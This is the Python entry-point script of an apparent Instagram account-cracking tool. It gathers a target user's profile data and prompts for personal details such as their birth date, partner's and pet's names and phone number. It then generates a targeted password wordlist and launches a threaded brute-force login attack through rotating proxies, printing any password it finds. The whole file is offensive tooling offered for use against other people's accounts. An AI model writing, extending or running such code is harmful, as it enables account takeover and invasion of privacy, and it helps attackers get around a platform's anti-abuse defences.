#!/usr/bin/env python3
import json
import os
import sys

sys.path.insert(0, os.path.dirname(os.path.abspath(__file__)))

from core.banner import (
    C,
    G,
    M,
    R,
    RE,
    W,
    Y,
    console,
    show_banner,
    show_info_panel,
    show_menu,
    show_password_stats,
)
from core.brute_attacker import BruteAttacker
from core.config import DATA_DIR, OUTPUT_DIR, TARGET_PASSWORD_COUNT
from core.info_gather import InstagramInfoGatherer
from core.password_engine import PasswordEngine
from core.proxy_rotator import ProxyRotator

try:
    from core import config as app_config
except Exception:
    app_config = None


def collect_personal_info(username):
    console.print(f"\n{M}[ PERSONAL INFORMATION COLLECTION ]{RE}")
    console.print(f"{Y}Enter as much info as you know about @{username}{RE}")
    console.print(f"{Y}More information = better password generation{RE}\n")

    personal_info = {
        "real_name": "",
        "birth_date": "",
        "birth_day": "",
        "birth_month": "",
        "birth_year": "",
        "girlfriend_name": "",
        "pet_name": "",
        "favorite_thing": "",
        "nickname": "",
        "phone_number": "",
        "additional_words": [],
    }

    personal_info["real_name"] = input(f"{C}[?] Real full name: {W}").strip()
    personal_info["birth_date"] = input(f"{C}[?] Birth date (DD/MM/YYYY): {W}").strip()

    if not personal_info["birth_date"]:
        personal_info["birth_day"] = input(f"{C}[?] Birth day (DD): {W}").strip()
        personal_info["birth_month"] = input(f"{C}[?] Birth month (MM): {W}").strip()
        personal_info["birth_year"] = input(f"{C}[?] Birth year (YYYY): {W}").strip()

    personal_info["girlfriend_name"] = input(
        f"{C}[?] Girlfriend/Boyfriend name: {W}"
    ).strip()
    personal_info["pet_name"] = input(f"{C}[?] Pet name: {W}").strip()
    personal_info["favorite_thing"] = input(
        f"{C}[?] Favorite thing (sport/team/hobby): {W}"
    ).strip()
    personal_info["nickname"] = input(f"{C}[?] Nickname: {W}").strip()
    personal_info["phone_number"] = input(f"{C}[?] Phone number: {W}").strip()

    extra = input(
        f"{C}[?] Extra words (comma separated): {W}"
    ).strip()
    if extra:
        personal_info["additional_words"] = [
            x.strip() for x in extra.split(",") if x.strip()
        ]

    return personal_info


def _make_gatherer():
    pr = ProxyRotator()
    proxy = pr.get_next_proxy() if pr.proxies else None
    return InstagramInfoGatherer(proxy=proxy, proxy_list=pr.list_proxies())


def mode_info_gathering():
    show_banner()
    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
        "@"
    )
    if not username:
        console.print(f"{R}[!] Username required!{RE}")
        return

    gatherer = _make_gatherer()
    data = gatherer.extract_profile_data(username)
    show_info_panel(username, data)


def mode_password_generation():
    show_banner()
    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
        "@"
    )
    if not username:
        console.print(f"{R}[!] Username required!{RE}")
        return

    use_net = input(f"{C}[?] Fetch profile from Instagram? (y/n): {W}").strip().lower()
    data = {"username": username}
    if use_net in ("y", "yes", ""):
        gatherer = _make_gatherer()
        data = gatherer.extract_profile_data(username)
        show_info_panel(username, data)

    personal = collect_personal_info(username)
    engine = PasswordEngine(target_data=data, personal_info=personal)

    try:
        count = int(
            input(
                f"{C}[?] How many passwords? [{TARGET_PASSWORD_COUNT}]: {W}"
            ).strip()
            or str(TARGET_PASSWORD_COUNT)
        )
    except ValueError:
        count = TARGET_PASSWORD_COUNT

    console.print(f"{Y}[*] Generating passwords...{RE}")
    passwords = engine.generate_passwords(target_count=count)
    show_password_stats(passwords)

    os.makedirs(os.path.join(DATA_DIR, "wordlists"), exist_ok=True)
    out = os.path.join(DATA_DIR, "wordlists", f"{username}_passwords.txt")
    with open(out, "w", encoding="utf-8") as f:
        for p in passwords:
            f.write(p + "\n")
    console.print(f"{G}[+] Saved: {out}{RE}")


def mode_full_attack():
    show_banner()
    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
        "@"
    )
    if not username:
        console.print(f"{R}[!] Username required!{RE}")
        return

    gatherer = _make_gatherer()
    data = gatherer.extract_profile_data(username)
    show_info_panel(username, data)

    personal = collect_personal_info(username)
    engine = PasswordEngine(target_data=data, personal_info=personal)
    console.print(f"{Y}[*] Generating passwords...{RE}")
    passwords = engine.generate_passwords()
    show_password_stats(passwords)

    os.makedirs(os.path.join(DATA_DIR, "wordlists"), exist_ok=True)
    wl = os.path.join(DATA_DIR, "wordlists", f"{username}_passwords.txt")
    with open(wl, "w", encoding="utf-8") as f:
        for p in passwords:
            f.write(p + "\n")
    console.print(f"{G}[+] Wordlist: {wl}{RE}")

    confirm = input(f"\n{C}[?] Start attack? (yes/no): {W}").strip().lower()
    if confirm not in ("yes", "y"):
        return

    try:
        threads = int(input(f"{C}[?] Threads (1-5): {W}").strip() or "2")
        threads = max(1, min(5, threads))
    except ValueError:
        threads = 2

    found = BruteAttacker(username, passwords, ProxyRotator()).start_attack(
        threads=threads
    )
    if found:
        console.print(f"\n{G}{'=' * 60}{RE}")
        console.print(f"{G}Username: {username}{RE}")
        console.print(f"{G}Password: {found}{RE}")
        console.print(f"{G}{'=' * 60}{RE}")
    else:
        console.print(f"\n{Y}[!] Password not found in generated list{RE}")


def mode_brute_force_only():
    show_banner()
    username = input(f"\n{C}[?] Enter target Instagram username: {W}@").strip().lstrip(
        "@"
    )
    wordlist_path = input(f"{C}[?] Path to wordlist file: {W}").strip()
    if not username or not wordlist_path:
        console.print(f"{R}[!] Username and wordlist required!{RE}")
        return
    if not os.path.exists(wordlist_path):
        console.print(f"{R}[!] Wordlist file not found!{RE}")
        return

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        passwords = [line.strip() for line in f if line.strip()]
    console.print(f"{G}[+] Loaded {len(passwords):,} passwords{RE}")

    confirm = input(f"\n{C}[?] Start attack? (yes/no): {W}").strip().lower()
    if confirm not in ("yes", "y"):
        return

    try:
        threads = int(input(f"{C}[?] Threads (1-5): {W}").strip() or "2")
        threads = max(1, min(5, threads))
    except ValueError:
        threads = 2

    BruteAttacker(username, passwords, ProxyRotator()).start_attack(threads=threads)


def mode_proxy_config():
    show_banner()
    proxy_rotator = ProxyRotator()
    while True:
        console.print(f"\n{M}[ PROXY CONFIGURATION ]{RE}")
        console.print(f"{C}[1] View loaded proxies ({len(proxy_rotator.proxies)}){RE}")
        console.print(f"{C}[2] Add proxy{RE}")
        console.print(f"{C}[3] Remove proxy{RE}")
        console.print(f"{C}[4] Import proxy list from file{RE}")
        console.print(f"{C}[0] Back to main menu{RE}")
        choice = input(f"\n{Y}[?] Select: {W}").strip()

        if choice == "1":
            if proxy_rotator.proxies:
                for i, p in enumerate(proxy_rotator.proxies, 1):
                    print(f"    {C}{i}.{W} {p}")
            else:
                print(f"    {Y}No proxies configured{RE}")
        elif choice == "2":
            proxy = input(
                f"{C}[?] Enter proxy (ip:port or ip:port:user:pass): {W}"
            ).strip()
            if proxy_rotator.add_proxy(proxy):
                console.print(f"{G}[+] Proxy added{RE}")
            else:
                console.print(f"{Y}[!] Proxy already exists or empty{RE}")
        elif choice == "3":
            idx = input(f"{C}[?] Enter proxy number to remove: {W}").strip()
            try:
                idx = int(idx) - 1
                if 0 <= idx < len(proxy_rotator.proxies):
                    proxy_rotator.remove_proxy(proxy_rotator.proxies[idx])
                    console.print(f"{G}[+] Proxy removed{RE}")
                else:
                    console.print(f"{R}[!] Invalid index{RE}")
            except ValueError:
                console.print(f"{R}[!] Invalid input{RE}")
        elif choice == "4":
            filepath = input(f"{C}[?] Path to proxy list file: {W}").strip()
            if os.path.exists(filepath):
                with open(filepath, "r", encoding="utf-8", errors="ignore") as f:
                    for line in f:
                        line = line.strip()
                        if line and not line.startswith("#"):
                            proxy_rotator.add_proxy(line)
                console.print(f"{G}[+] Proxies imported{RE}")
            else:
                console.print(f"{R}[!] File not found{RE}")
        elif choice == "0":
            break


def mode_view_results():
    show_banner()
    results_dir = OUTPUT_DIR
    if not os.path.exists(results_dir):
        console.print(f"{Y}[!] No results directory{RE}")
        return
    files = [f for f in os.listdir(results_dir) if f.endswith(".json")]
    if not files:
        console.print(f"{Y}[!] No results found{RE}")
        return
    console.print(f"\n{G}[ RESULTS ]{RE}")
    for fname in files:
        filepath = os.path.join(results_dir, fname)
        with open(filepath, "r", encoding="utf-8") as rf:
            try:
                data = json.load(rf)
                console.print(f"\n{C}File: {fname}{RE}")
                console.print(f"  Found: {data.get('found', False)}")
                console.print(f"  Password: {data.get('correct_password', 'N/A')}")
                console.print(f"  Attempts: {data.get('attempts', 0):,}")
            except Exception:
                console.print(f"  {Y}File: {fname}{RE}")


def mode_settings():
    show_banner()
    if app_config is None:
        console.print(f"{R}[!] config not loaded{RE}")
        return
    console.print(f"\n{M}[ SETTINGS & CONFIGURATION ]{RE}")
    console.print(f"{C}Target Password Count:{W} {app_config.TARGET_PASSWORD_COUNT}{RE}")
    console.print(f"{C}Min Delay:{W} {app_config.MIN_DELAY}s{RE}")
    console.print(f"{C}Max Delay:{W} {app_config.MAX_DELAY}s{RE}")
    console.print(f"{C}Max Attempts per IP:{W} {app_config.MAX_ATTEMPTS_PER_IP}{RE}")
    console.print(f"{C}Cooldown Period:{W} {app_config.COOLDOWN_PERIOD}s{RE}")
    print(f"\n{Y}[*] Edit core/config.py to modify these settings{RE}")


def main():
    try:
        while True:
            show_banner()
            show_menu()
            choice = input().strip()
            if choice == "1":
                mode_info_gathering()
            elif choice == "2":
                mode_password_generation()
            elif choice == "3":
                mode_full_attack()
            elif choice == "4":
                mode_brute_force_only()
            elif choice == "5":
                mode_proxy_config()
            elif choice == "6":
                mode_view_results()
            elif choice == "7":
                mode_settings()
            elif choice == "0":
                console.print(f"\n{G}[+] Goodbye!{RE}\n")
                sys.exit(0)
            else:
                console.print(f"{R}[!] Invalid option!{RE}")
            if choice in ("1", "2", "3", "4", "6", "7"):
                input(f"\n{Y}[*] Press Enter to continue...{RE}")
    except KeyboardInterrupt:
        console.print(f"\n\n{Y}[!] Interrupted by user{RE}")
        console.print(f"{G}[+] Goodbye!{RE}\n")
        sys.exit(0)


if __name__ == "__main__":
    main()
